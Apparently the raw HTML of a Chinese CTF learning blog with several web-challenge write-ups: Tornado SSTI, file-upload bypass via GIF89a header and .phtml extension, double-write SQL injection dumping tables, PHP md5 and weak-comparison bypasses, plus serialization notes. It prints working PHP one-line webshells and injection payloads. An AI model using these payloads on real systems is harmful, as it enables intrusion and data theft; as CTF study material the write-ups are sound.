class="number">100000</span>):</span><br><span class="line">    i=str(i)</span><br><span class="line">    j=b64encode(i.encode())</span><br><span class="line">    j=j.decode()</span><br><span class="line">    r=requests.get(url+i+url2+j+<span class="string">&#x27;==&#x27;</span>)</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;失败了&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">print</span> (r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/12/bugku3/image-20210712202522647.png" alt="image-20210712202522647"></p>
<p>我们可以看到临界点就是3000分</p>
<p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44190459/article/details/116648352">https://blog.csdn.net/weixin_44190459/article/details/116648352</a></p>
<h1 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h1><p>打开容器我们就可以看到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^\w+$/&quot;</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>代码审计我们得知我们传参的值定只含数字，字母，下划线。因此这里过滤了所有的符号。</p>
<p>但是我们看到这里存在一个可变变量，<br><strong>可变变量</strong>：</p>
<p><code>是一种独特的变量，它允许动态改变一个变量名称。其工作原理是该变量的名称由另外一个变量的值来确定，实现过程就是在变量的前面再多加一个美元符号“S”。</code></p>
<p>而这里**var_dump()**函数 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。结合可变变量名那么就会返回对应的键值。</p>
<p>此时我们要联想到php中超全局变量 <code>$GLOBALS </code>，PHP 在名为<code>$GLOBALS[index]</code>的数组中存储了所有全局变量</p>
<p>因此构造payload：<code>?args=GLOBLAS</code></p>
<p><img src="/2021/07/12/bugku3/image-20210712210315711.png" alt="image-20210712210315711"></p>
<p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xuchen16/article/details/82737194">https://blog.csdn.net/xuchen16/article/details/82737194</a></p>
<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><p>点开容器就给我们一长串数字要我们在两秒内计算完成，显然是不可能实现的，因此需要构造脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://114.67.246.176:19230/&#x27;&#x27;&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">retuen = s.get(url)</span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>, retuen.text).group()</span><br><span class="line">result = eval(equation)</span><br><span class="line">key = &#123;<span class="string">&#x27;value&#x27;</span>:result&#125;</span><br><span class="line">print(s.post(url, data = key).text)</span><br></pre></td></tr></table></figure>

<p>跑脚本的时候可能不会每次都出flag（可能给出的式子溢出或者什么的），没出就多跑几次</p>
<p><img src="/2021/07/12/bugku3/image-20210712212923522.png" alt="image-20210712212923522"></p>
<p>参考资料：关于对python脚本的理解（主要是python脚本下的正则匹配）：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43578492/article/details/101701339">https://blog.csdn.net/weixin_43578492/article/details/101701339</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/12/bugku3/" data-id="ckr0oba32001vi8vuhdkb309e" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-buuctf5" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/11/buuctf5/" class="article-date">
  <time datetime="2021-07-11T01:35:54.000Z" itemprop="datePublished">2021-07-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/11/buuctf5/">buuctf5</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>打开容器发现有三个txt文件:</p>
<p>/flag.txt<img src="/2021/07/11/buuctf5/image-20210711102359108.png" alt="image-20210711102359108">，由此我们猜测flag最终可能藏在/fllllllllllllag之下</p>
<p>/welcome.txt<img src="/2021/07/11/buuctf5/image-20210711102442865.png" alt="image-20210711102442865">，因为render是生成模板函数，所以考虑是否存在ssti注入</p>
<p><strong>sp：</strong>render函数的介绍<code>https://blog.csdn.net/qq78827534/article/details/80792514</code></p>
<p>/hints.txt<img src="/2021/07/11/buuctf5/image-20210711103502285.png" alt="image-20210711103502285"></p>
<p>结合URL栏的信息，我们可知filehash的值是md5(cookie_secret+md5(filename))，也即此处filehash的值是md5(cookie_secret+md5(hints))</p>
<p>但是这里有个疑问cookie_secret是什么呢？通过查阅大佬的博客发现<code>cookie_secret</code>在<code>Application</code>对象<code>settings</code>属性中，还发现<code>self.application.settings</code>有一个别名。<code>handler</code>指向处理当前这个页面的<code>RequestHandler</code>对象，<br><code> RequestHandler.settings</code>指向<code>self.application.settings</code>，<br> 因此<code>handler.settings</code>指向<code>RequestHandler.application.settings</code></p>
<p>知道了<code>cookie_secret</code>在哪了，就要想着怎么获取它，之前提到可能存在ssti注入，</p>
<p>现在来验证一下，当我输入<code>?filename=/flag.txt&amp;filehash=&#123;&#123;1&#125;&#125;</code>：<img src="/2021/07/11/buuctf5/image-20210711110240488.png" alt="image-20210711110240488"></p>
<p>说明存在ssti漏洞，虽然它过滤掉了一些字符，但是这里Error=Error。</p>
<p>因此结合前面获取<code>cookie_secret</code>的方法，</p>
<p>构造payload：<code>http://e7be24f2-7da0-43fa-a090-c9e6e96f1049.node4.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
<p><img src="/2021/07/11/buuctf5/image-20210711110817583.png" alt="image-20210711110817583"></p>
<p>使用下面脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">s1=(hashlib.md5(<span class="string">&quot;/fllllllllllllag&quot;</span>.encode())).hexdigest()</span><br><span class="line">print((hashlib.md5((<span class="string">&quot;87928a6f-e43f-4549-bc43-a101005cfb7f&quot;</span>+s1).encode())).hexdigest())</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/11/buuctf5/image-20210711111116510.png" alt="image-20210711111116510"></p>
<p>构造payload：</p>
<p><code>http://e7be24f2-7da0-43fa-a090-c9e6e96f1049.node4.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=61f9debba03909a86238270e8c7fb594</code><img src="/2021/07/11/buuctf5/image-20210711111239462.png" alt="image-20210711111239462"></p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>感觉关于获取<code>cookie_secret</code>那块还是有点模糊，ssti也是一大块的内容，暂时初学了一点。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/96480967">https://blog.csdn.net/zz_Caleb/article/details/96480967</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45642610/article/details/112519061">https://blog.csdn.net/weixin_45642610/article/details/112519061</a></p>
<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>打开容器，发现是一道文件上传漏洞题，尝试上传webshell.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/11/buuctf5/image-20210713090617848.png" alt="image-20210713090617848"></p>
<p>也就是说我们只能上传图片后缀的文件，尝试上传webshell.gif文件然后抓包改为webshell.phtml：</p>
<p><img src="/2021/07/11/buuctf5/image-20210713091020061.png" alt="image-20210713091020061"></p>
<p>修改一句话木马webshell2.gif：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>(@POST[<span class="string">&#x27;pass&#x27;</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>然后上传webshell2.gif文件：<img src="/2021/07/11/buuctf5/image-20210713091437148.png" alt="image-20210713091437148"></p>
<p>也就是他对文件头也进行了检查，这里其实就设立了一个考点——关于GIF89a文件头欺骗，它可以绕过文件头检查。因此再修改一句话木马webshell3.gif：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(@POST[<span class="string">&#x27;pass&#x27;</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>上传webshell3.gif文件然后抓包改为webshell3.phtml，</p>
<p>上传成功！</p>
<p>然后用蚁剑连接，猜测上传路径是/upload</p>
<p><img src="/2021/07/11/buuctf5/image-20210713092317729.png" alt="image-20210713092317729"></p>
<p>连接成功，打开虚拟终端，<code>cat /flag</code>：</p>
<p><img src="/2021/07/11/buuctf5/image-20210713092412953.png" alt="image-20210713092412953"></p>
<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>打开容器，是一道文件上传题。</p>
<p>上传一句话木马webshell.jpg：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p>上传webshell.jpg   抓包改后缀webshell.php</p>
<p>上传失败</p>
<p>再上传webshell.jpg   抓包改后缀webshell.phtml</p>
<p>上传成功，蚁剑连接，cat /flag</p>
<p><img src="/2021/07/11/buuctf5/image-20210713100257941.png" alt="image-20210713100257941"></p>
<h5 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h5><p>感觉这题比上面那题还容易，就仅对文件上传后缀进行了限制</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/11/buuctf5/" data-id="ckr0oba350023i8vu6xtj4078" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-CTF工具用法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/06/06/CTF%E5%B7%A5%E5%85%B7%E7%94%A8%E6%B3%95/" class="article-date">
  <time datetime="2021-06-06T03:16:10.000Z" itemprop="datePublished">2021-06-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/06/06/CTF%E5%B7%A5%E5%85%B7%E7%94%A8%E6%B3%95/">CTF工具用法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>指令：python dirsearch.py -u”127.0.0.1”</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/06/CTF%E5%B7%A5%E5%85%B7%E7%94%A8%E6%B3%95/" data-id="ckr0oba2d000ai8vu9s1u33qj" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-buuctf4" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/05/23/buuctf4/" class="article-date">
  <time datetime="2021-05-23T06:43:06.000Z" itemprop="datePublished">2021-05-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/05/23/buuctf4/">buuctf4</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>打开容器，发现是一个登入得界面，确定是一道SQL注入题</p>
<p>先用万能密码尝试一下：<img src="/buuctf4.assets/image-20210523144707563.png" alt="image-20210523144707563"></p>
<p>我们看到or并没有起到作用，说明他被过滤了，尝试<strong>双写</strong>绕过：<img src="/buuctf4.assets/image-20210523144955969.png" alt="image-20210523144955969"></p>
<p>我们看到登入成功了，尝试union联合注入，但是我们发现服务器过滤了union 和 select，也尝试双写绕过：</p>
<p>?username=1’%20 uniounionn selecselectt 1%23&amp;password=123</p>
<p><img src="/buuctf4.assets/image-20210523145610941.png" alt="image-20210523145610941"></p>
<p>我们看到成功注入了，但是列数不匹配，增加列数：<img src="/buuctf4.assets/image-20210523145912955.png" alt="image-20210523145912955"></p>
<h4 id="开始爆库："><a href="#开始爆库：" class="headerlink" title="开始爆库："></a>开始爆库：</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,database()%23&amp;password=1</code>返回的是默认数据库</p>
<p><img src="/buuctf4.assets/image-20210523150044941.png" alt="image-20210523150044941"></p>
<p>查一下所有数据库：</p>
<p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom (infoorrmation_schema.schemata) %23&amp;password=1</code><img src="/buuctf4.assets/image-20210523163448632.png" alt="image-20210523163448632"></p>
<p>感觉flag可能藏在<code>ctf</code>数据库中</p>
<h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(table_name)frofromm(infoorrmation_schema.tables)whwhereere table_schema=&#39;ctf&#39; %23&amp;password=1</code></p>
<p><img src="/buuctf4.assets/image-20210523151431699.png" alt="image-20210523151431699"></p>
<h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frofromm (infoorrmation_schema.columns) wherwheree table_name=&quot;Flag&quot;%23&amp;password=1</code></p>
<p><img src="/buuctf4.assets/image-20210523164546430.png" alt="image-20210523164546430"></p>
<h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(flag) frofromm (ctf.Flag)%23&amp;password=1</code></p>
<p><img src="/buuctf4.assets/image-20210523170907245.png" alt="image-20210523170907245"></p>
<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开容器发现一段php代码，整理得：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<p>代码审计可知，我们通过GET获取gg和id两个参数，通过POST获取passwd。</p>
<p>先来看第一个判断语句：if(  md5($id) === md5($gg) &amp;&amp; $id !== $gg )</p>
<p>它要求我们两组参数的值要不相等，但md5编码后的值相等</p>
<p>我们之前有做过md5绕过，弱等于判断，这里可以利用数组绕过md5。因为md5无法编码数组，会返回null。</p>
<p>构造第一个payload：<code>?id[]=1&amp;gg[]=2</code></p>
<p>再看第二个判断语句：if (   !is_numeric($passwd)    )<br>                                               if(     $passwd==1234567    )<br>他要求我们POST的参数passwd的值类型不为数字，但是又判断passwd的值是都等于1234567，这里我们可以使用弱等于绕过</p>
<p>构造第二个payload：<code>password=1234567a</code></p>
<p>最后，通过hackbar上传我们的payload即可获取flag<img src="/buuctf4.assets/image-20210710103012191.png" alt="image-20210710103012191"></p>
<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>打开容器，发现就一个查询框，查看源码没发现什么重要的信息。</p>
<p>随机输入数字1，发现没什么回显，但是看到URL栏跳出passwd=1</p>
<p>尝试抓包：</p>
<p><img src="/buuctf4.assets/image-20210710174945601.png" alt="image-20210710174945601"></p>
<p>发现回文中藏着hint——将我们输入上传的passwd经过md5编码后带入sql查询语句。</p>
<p>这里介绍一下md5()函数：</p>
<p><strong>语法</strong>：<code>md5(string,raw)</code></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定要计算的字符串。</td>
</tr>
<tr>
<td><em>raw</em></td>
<td>可选。规定十六进制或二进制输出格式：  TRUE - 原始 16 字符二进制格式                                                                                                                               FALSE - 默认。32 字符十六进制数</td>
</tr>
</tbody></table>
<p>**sp:**原始二进制数据不是指0101这些二进制数据，而是原始字符串转换成ascii码后组成的字符串。</p>
<p>关于md5输出原始二进制的转换过程和机制参考博客：<a target="_blank" rel="noopener" href="https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/">https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/</a></p>
<p>我们可以看到提示要求我们输入的passwd经过md5编码后要等于真的密码，但是我们怎么会知道密码呢，那么关键点肯定就是在md5上。通过查阅资料我们得知可以使用<code>ffifdyop</code>绕过，其经过<code>md5(ffifdyop,raw)</code>后为<code>&#39;or&#39;6xxxxxxxxxx</code>；</p>
<p>带入sql语句中为：<code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6xxxxxxxxxx&#39;</code>，也就是说构成了一句用真式。那么这时带入数据库中就不会返回空了。</p>
<p>输入ffifdyop后跳转到一个新的页面，查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>这里我们用数组绕过md5即可，构造payload：<code>?a[]=a&amp;b[]=b</code>   绕过</p>
<p>有跳转到另一个页面，又是一串代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>这里我们依旧采用数组绕过md5即可：<img src="/buuctf4.assets/image-20210710214847048.png" alt="image-20210710214847048"></p>
<p>需要注意的是后面一个等号是强等于，那么我们就不能使用哈希碰撞来绕过md5。因为PHP强等于时就不会把以0E开头的哈希值解释为0。</p>
<p><strong>sp：</strong>最近还做了蛮多md5绕过的题，有一个关于md5绕过的博客写的挺全面的：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/05/23/buuctf4/" data-id="ckr0oba340021i8vu253k2kxs" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-序列化与反序列化" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/05/22/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time datetime="2021-05-22T02:37:59.000Z" itemprop="datePublished">2021-05-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/05/22/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">序列化与反序列化</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="序列和反序列化："><a href="#序列和反序列化：" class="headerlink" title="序列和反序列化："></a>序列和反序列化：</h1><p>简单来说：</p>
<p>序列化——将变量或对象转换成字符串的过程。</p>
<p>反序列化——将字符串转换成变量或对象的过程。</p>
<p><img src="/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20210522104245613.png" alt="image-20210522104245613"></p>
<h2 id="常见的魔术方法："><a href="#常见的魔术方法：" class="headerlink" title="常见的魔术方法："></a>常见的魔术方法：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_construct()：创建对象时初始化</span><br><span class="line">_destruction()：结束时销毁对象</span><br><span class="line">_toString()：对象被当作字符串时使用</span><br><span class="line">_sleep()：序列化对象之前调用</span><br><span class="line">_wakeup()：反序列化对象之前调用</span><br><span class="line">_call()：调用对象不存在时使用</span><br><span class="line">_get()：调用私有属性时使用</span><br></pre></td></tr></table></figure>



<h2 id="常见的访问控制修饰符"><a href="#常见的访问控制修饰符" class="headerlink" title="常见的访问控制修饰符"></a>常见的访问控制修饰符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public(公有)</span><br><span class="line">protected(受保护)</span><br><span class="line">private(私有的)</span><br><span class="line">protected属性被序列化的时候属性值会变成：%00*%00属性名</span><br><span class="line">private属性被序列化的时候属性值会变成：%00类名%00属性名</span><br></pre></td></tr></table></figure>



<p>借阅资料：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bmth666/article/details/104737025">https://blog.csdn.net/bmth666/article/details/104737025</a></p>

      
    </div>
    <footer class="article-footer">
